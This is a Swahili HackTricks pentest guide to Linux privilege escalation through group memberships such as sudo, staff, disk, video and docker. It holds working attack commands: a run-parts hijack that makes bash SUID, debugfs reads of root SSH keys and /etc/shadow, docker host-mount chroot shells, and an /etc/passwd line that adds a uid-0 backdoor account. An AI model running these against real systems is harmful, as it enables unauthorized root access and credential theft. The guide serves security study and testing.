# Makundi Yanayovutia - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Makundi ya Sudo/Admin

### **PE - Method 1**

**Wakati mwingine**, sera ya **/etc/sudoers** ya mfumo (au faili iliyojumuishwa kutoka humo) huwa na maingizo kama haya:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Hii inamaanisha kwamba mtumiaji yeyote anayelingana na mojawapo ya maingizo hayo anaweza kutumia `sudo` kutekeleza amri yoyote kama mtumiaji mwingine yeyote lengwa (kwa kuzingatia masharti mengine ya sera).<sup>[[3]](#references)</sup>

Ikiwa ndivyo, ili **kuwa root unaweza kutekeleza tu**:

```
sudo su
```

Ikiwa `sudo -l` inaruhusu matumizi yenye vikwazo ya `adduser` yenye jina la mtumiaji pekee, angalia kama inaunda group ya msingi yenye jina hilo hilo ambayo bado haipo. Akaunti mpya katika group hiyo inaweza kupata privileges ikiwa sera inayotumika ya sudoers tayari inaziruhusu kwa `%group`; thibitisha tabia ya kuunda group na sheria ya group kabla ya kuchukulia hili kama njia ya escalation. Kuunda akaunti hubadilisha mfumo, kwa hivyo kagua sera kwanza.

### PE - Method 2

Tafuta binaries zote za suid na uangalie kama kuna binary ya **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Ikiwa **pkexec ni binary ya SUID**, inaweza kuendesha programu kama mtumiaji mwingine tu wakati polkit inaidhinisha kitendo kilichoombwa; biti ya SUID pekee haihakikishi root. Kagua sera iliyosakinishwa na uidhinishaji wa session lengwa badala ya kudhani kuwa uanachama wa **sudo** au **admin** unatosha.<sup>[[4]](#references)[[5]](#references)</sup>

Kwa njia tofauti ya [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), hakikisha kwanza kuwa `pkexec` ni faili inayotekelezeka inayomilikiwa na **root na yenye SUID**. Binary iliyosakinishwa bila biti hiyo si njia ya kupandisha mamlaka ya ndani iliyoelezwa kwenye ushauri wa usalama. Mfuatano wa toleo la upstream ni kidokezo tu: distributions zinaweza [kurudisha marekebisho kwenye matoleo ya zamani ya vifurushi](https://ubuntu.com/security/CVE-2021-4034), kwa hiyo kagua kifurushi cha vendor kilichosakinishwa na hatua za kupunguza hatari kabla ya kusema kuwa kina udhaifu.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) ni njia tofauti ya polkit: race ya uidhinishaji wa D-Bus, si dosari ya SUID ya `pkexec`. Kagua kifurushi cha vendor cha polkit kilichosakinishwa na ikiwa kitendo cha D-Bus chenye mamlaka kinachoweza kufikiwa kinaweza kufanya mabadiliko yenye manufaa; njia ya kuunda akaunti pia inahitaji huduma inayofaa kama AccountsService, na ufikiaji wa sudo wa kundi lolote jipya hutegemea sera ya sudo inayotumika. Toleo la polkit lililoripotiwa au huduma iliyosakinishwa pekee ni dalili tu, hasa pale vendors [wanaporudisha marekebisho](https://access.redhat.com/security/cve/cve-2021-3560). Uchanganuzi tulivu haupaswi kuanzisha race.

Kwenye distributions ambazo bado zinatumia backend ya zamani ya Local Authority, kagua kanuni zake za makundi kwa kutumia:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Majina ya vikundi vinavyohusika na mipangilio chaguomsingi hutofautiana kulingana na distro; kikundi kinafaa hapa tu ikiwa sera ya ndani inakitaja.<sup>[[5]](#references)</sup>

Ili **kuwa root unaweza kutekeleza**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Ukijaribu kutekeleza **pkexec** na ukapata **hitilafu** hii:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Katika kipindi cha SSH kisicho na authentication agent iliyosajiliwa, `pkexec` inaweza kushindwa kwa hitilafu hii hata kama sera ingeruhusu kitendo hicho; polkit inaeleza `pkttyagent` kama authentication agent ya maandishi kwa vipindi visivyo vya desktop. Tabia halisi hutegemea toleo na distribution, kwa hiyo thibitisha sera ya ndani na usanidi wa agent. Workaround moja iliyoripotiwa kwa matoleo yaliyoathirika ya NixOS hutumia **vipindi 2 tofauti vya SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL inayomnyima akaunti moja ufikiaji wa `su` inahusu executable hiyo, si kila njia ya kutekeleza kitendo kinachoruhusiwa kwa administrator. Ikiwa credential ya administrator imefichuka kivyake, kagua ikiwa kitendo tofauti, kama kuanzisha system service ya muda kupitia `systemd-run`, kinaruhusiwa na sera ya polkit inayotumika, authentication agent inakubali utambulisho upi, na service itakayotokana nayo itatumia utambulisho upi. [Polkit hutofautisha authentication kama mmiliki wa session na kama administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), huku [systemd-run ikiweza kuomba system manager ianzishe service ya muda](https://systemd.io/CONTROL_GROUP_INTERFACE/). Ingizo kwenye history, amri iliyosakinishwa, au faili ya sera inayosomeka peke yake haithibitishi ruhusa au uhalali wa credential; ukaguzi usiofanya mabadiliko haupaswi kuingiza credentials wala kuanzisha unit.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Group

Wakati mwingine sera ya sudoers inaweza pia kuwa na ingizo hili:

```
%wheel	ALL=(ALL:ALL) ALL
```

Hii inamaanisha kwamba mtumiaji yeyote anayelingana na ingizo hilo anaweza kutekeleza amri yoyote kama mtumiaji lengwa yeyote kupitia `sudo` (kwa kuzingatia sera iliyobaki).<sup>[[3]](#references)</sup>

Ikiwa ndivyo, ili **kuwa root unaweza kutekeleza tu**:

```
sudo su
```

## Kikundi cha Shadow

Kwenye mifumo ambayo ruhusa zake zinatoa uwezo huo, watumiaji katika kikundi cha **shadow** wanaweza **kusoma** **/etc/shadow**; thibitisha mode na ACLs halisi kwenye mfumo lengwa:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Kwa hiyo, soma faili na ujaribu ku-crack baadhi ya hashes.

Nuance muhimu kuhusu hali ya kufungwa unapochambua hashes:
- Maingizo yenye `!` au `*` kwa ujumla hayaruhusu kuingia kwa nenosiri kwa njia ya interactive.
- `!hash` inamaanisha nenosiri lilifungwa; herufi zilizobaki zinawakilisha sehemu ya nenosiri ilivyokuwa kabla ya kufungwa.
- Sehemu yenye `*` si hash halali ya `crypt(3)` na huzuia kuingia kwa nenosiri la UNIX; usihitimishe kutokana nayo kama nenosiri liliwahi kuwekwa au la.
Hii ni muhimu kwa uainishaji wa akaunti hata wakati kuingia moja kwa moja kumezuiwa.<sup>[[6]](#references)</sup>

## Kikundi cha staff

**staff**: Huruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji ruhusa za root (kumbuka kuwa programu zinazotekelezeka katika `/usr/local/bin` zimo kwenye kigezo cha PATH cha mtumiaji yeyote, na zinaweza "kuchukua nafasi ya" programu zinazotekelezeka katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kikundi cha "adm", kinachohusiana zaidi na ufuatiliaji/usalama.<sup>[[2]](#references)[[7]](#references)</sup>

Katika usanidi wa Debian ambapo `/usr/local/bin` hutangulia `/usr/bin` kwenye `PATH` (kama ilivyo katika mifano iliyo hapa chini), amri isiyo na njia kamili hutumia kwanza nakala iliyo katika `/usr/local/bin`; thibitisha `PATH` inayotumika kwenye mashine lengwa.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ikiwa mchakato wenye haki za juu unatafuta amri isiyo na njia kamili kupitia `/usr/local/bin` inayoweza kuandikwa, kubadilisha amri hiyo kunaweza kuitekeleza kwa haki za mchakato huo; thibitisha njia halisi na kichochezi kabla ya kufanya majaribio.

Kwenye mifumo ya Ubuntu, `pam_motd` huendesha hati zinazoweza kutekelezwa kupitia `run-parts --lsbsysinit` kama root wakati wa kuingia; kazi za cron pia zinaweza kutumia `run-parts`, lakini hili hutegemea usambazaji na usanidi.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Kwenye login mpya ya SSH, `pspy` inaweza kusaidia kuthibitisha kama njia hii inatumika kwenye target; inaweza kuona mistari ya amri ya process bila root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

Uanachama katika kundi la **disk** unaweza kutoa ufikiaji wa moja kwa moja kwa vifaa vya block na mara nyingi **uko karibu na ufikiaji wa root**; Debian inaeleza kuwa kwa kiasi kikubwa ni sawa na root, lakini hakikisha ruhusa halisi za kifaa na mpangilio wa hifadhi kwenye target.<sup>[[7]](#references)</sup>

Njia za kawaida za vifaa ni pamoja na `/dev/sd*`, lakini NVMe na mipangilio mingine ya hifadhi hutumia majina tofauti.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` hufanya kazi kwenye mifumo ya faili ya ext2/ext3/ext4; njia kama `/root` na `/etc/shadow` hapo juu ni faili zilizo ndani ya mfumo wa faili uliofunguliwa, ilhali hoja ya pili ya `dump` ni njia ya matokeo kwenye mfumo asilia wa faili.<sup>[[8]](#references)</sup> Kwa mfano, hii hutoa `/tmp/asd1.txt` kutoka kwenye mfumo wa faili uliofunguliwa na kuiweka kwenye `/tmp/asd2.txt` kwenye mfumo asilia wa faili:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Chaguo la `-w` hufungua mfumo wa faili kwa kusoma na kuandika, na amri ya `write` hunakili faili asilia kwenye mfumo wa faili uliofunguliwa. Epuka kuitumia kwenye mfumo wa faili uliowekwa kwenye mfumo unaoendelea kufanya kazi, kwa kuwa mabadiliko ya moja kwa moja yanaweza kuharibu mfumo wa faili; inapowezekana, tumia picha ya mfumo iliyo nje ya mtandao.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Kikundi cha Video

Kwa kutumia amri `w` unaweza kujua **nani ameingia kwenye mfumo** na itaonyesha matokeo kama yafuatayo.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Ingizo la **tty1** hutambua koni pepe ya kwanza ya Linux; lenyewe halithibitishi kwamba mtumiaji yupo kimwili kwenye mashine, hasa kwenye kontena au mazingira mengine.<sup>[[21]](#references)</sup>

Kwenye mifumo inayowasilisha kifaa cha framebuffer kinachosomeka, kuwa mwanachama wa kundi la **video** kunaweza kutoa ufikiaji wa kifaa hicho. Kiolesura cha Linux framebuffer kinaeleza `/dev/fb0` kama kifaa cha kumbukumbu kinachosomeka ambacho kinaweza kunakiliwa ili kupiga picha ya skrini; njia ya `/sys/class/graphics/fb0/virtual_size` inapatikana tu pale sifa hiyo ya fbdev sysfs ipo, kwa hivyo kagua lengwa kwanza.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Ikiwa toleo lililosakinishwa la **GIMP** lina importer ya raw data, fungua **`screen.raw`** kwa kutumia importer hiyo; usaidizi na vidhibiti hutofautiana kulingana na toleo na plug-in.<sup>[[22]](#references)</sup>

![Kikundi cha Disk - Kikundi cha Video: Ili kufungua picha ghafi, unaweza kutumia GIMP, kuchagua faili ya screen.raw na kuchagua Raw image data kama aina ya faili](<../../../images/image (463).png>)

Weka Width na Height za picha zilingane na jiometri ya framebuffer; jaribu miundo ya pixel/Image Types inayopatikana hadi matokeo yasomeke.<sup>[[9]](#references)</sup>

![Kikundi cha Disk - Kikundi cha Video: Kisha rekebisha Width na Height zilingane na zile zinazotumiwa kwenye skrini na ujaribu Image Types tofauti (kisha uchague inayoonyesha skrini vizuri zaidi)](<../../../images/image (317).png>)

## Kikundi cha Root

Kuwa mwanachama wa kikundi cha **root** hakukupi UID ya root, lakini faili zinazoweza kuandikwa na kikundi na zinazomilikiwa na `root` bado zinaweza kuvutia ikiwa huduma au maktaba zenye upendeleo wa juu zinazitumia. Thibitisha ruhusa halisi za faili na jinsi inavyotumiwa kabla ya kuichukulia kama njia ya kupandisha upendeleo.

**Angalia faili ambazo wanachama wa root wanaweza kurekebisha**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

Uanachama katika group ya `docker` hutoa ufikiaji wa kiwango cha root kwa Docker daemon kwenye installs za kawaida za rootful. Kwa kuwa bind mounts ni read-write kwa chaguo-msingi, mtumiaji anayeweza kudhibiti daemon hiyo anaweza kumount `/` ya host ndani ya container na kubadilisha faili za host; hili kwa vitendo humpa root kwenye host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Uanachama wa group unaweza kutolingana kati ya `/etc/group`, `/etc/gshadow`, na token ya mchakato wa sasa. Ikiwa mtumiaji haonekani kwenye `id -nG` lakini `newgrp docker` inafaulu, angalia group inayoonyeshwa na `id` kwenye shell mpya, kisha ujaribu kama Docker socket inaweza kuandikwa na kama inatumia daemon ya rootful. Jina la group pekee halithibitishi udhibiti wa host. Weka kikomo cha muda kwa probe yoyote ya kiotomatiki ya `newgrp` ili prompt ya nenosiri isiweze kusimamisha enumerasheni.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Hatimaye, ikiwa hupendi mapendekezo yoyote ya hapo awali, au hayafanyi kazi kwa sababu fulani (docker API firewall?), unaweza kujaribu **kuendesha privileged container na kutoroka kutoka humo** kama ilivyoelezwa hapa:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ikiwa una ruhusa za kuandika kwenye docker socket, soma [**chapisho hili kuhusu jinsi ya kuongeza privileges kwa kutumia vibaya docker socket**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Group

Kwa kawaida, **wanachama** wa group **`adm`** wana ruhusa ya **kusoma faili za log** zilizo ndani ya _/var/log/_.\
Kwa hivyo, ikiwa umedukua akaunti ya mtumiaji aliye kwenye group hili, hakikisha **unakagua log**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Makundi haya yana maana maalum kulingana na huduma na distro. Debian inaeleza `backup` kuwa ya kazi zilizokasimiwa za kuhifadhi/kurejesha data, `lp` kwa printer daemons, na `mail` kwa `/var/mail`; kwa hiyo, kagua ruhusa za mfumo husika kabla ya kuchukulia uanachama kuwa njia ya kupata privileges.<sup>[[7]](#references)</sup>

Mara nyingi huwa **njia za kugundua credentials** badala ya njia za moja kwa moja za kupata root:
- **backup**: inaweza kufichua archives zilizo na configs, keys, DB dumps au tokens.
- **operator**: ufikiaji wa uendeshaji mahususi kwa platform ambao unaweza kuvuja data nyeti ya runtime.
- **lp**: print queues/spools zinaweza kuwa na maudhui ya nyaraka.
- **mail**: mail spools zinaweza kufichua reset links, OTPs na credentials za ndani.

Chukulia uanachama katika makundi haya kama matokeo yenye thamani kubwa ya kufichuka kwa data, kisha endelea kwa kutumia tena password/token.

## Auth group

Kwenye OpenBSD, S/Key ikiwa imesanidiwa, `/etc/skey` inamilikiwa na `root:auth` na ufikiaji wa rekodi zake unahitaji group `auth`; rekodi za YubiKey huhifadhiwa katika `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Usanidi dhaifu wa OpenBSD 6.6 uliokuwa na S/Key au YubiKey iliyowezeshwa uliwaruhusu watumiaji wa ndani wenye privileges za `auth` kupata root; Qualys inaeleza sharti la awali na mfuatano wa exploit, na PoC iliyounganishwa inautekeleza.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Uthibitishaji wa pkexec/pkttyagent bila GUI session (suala la NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Wiki ya Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Kurasa za mwongozo za Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Mwongozo wa Marejeo wa polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Mwongozo wa Marejeo wa polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Mwongozo wa Kulinda Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Ukurasa wa mwongozo wa Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Kifaa cha Frame Buffer — Nyaraka za Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Kurasa za mwongozo za Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Kurasa za mwongozo za Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — upelelezi wa michakato ya Linux bila privileges](https://github.com/DominicBreuker/pspy)
- [13] [Usalama wa Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Dhibiti Docker kama mtumiaji asiye root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Kuendesha containers — Nyaraka za Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Kurasa za mwongozo za OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Kurasa za mwongozo za OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Udhaifu wa uthibitishaji katika OpenBSD — Ushauri wa Usalama wa Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC ya local exploit](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Vifaa vilivyogawiwa vya Linux (toleo la 4.x na kuendelea)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Uingizaji na Uhamishaji wa Picha — Nyaraka za GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
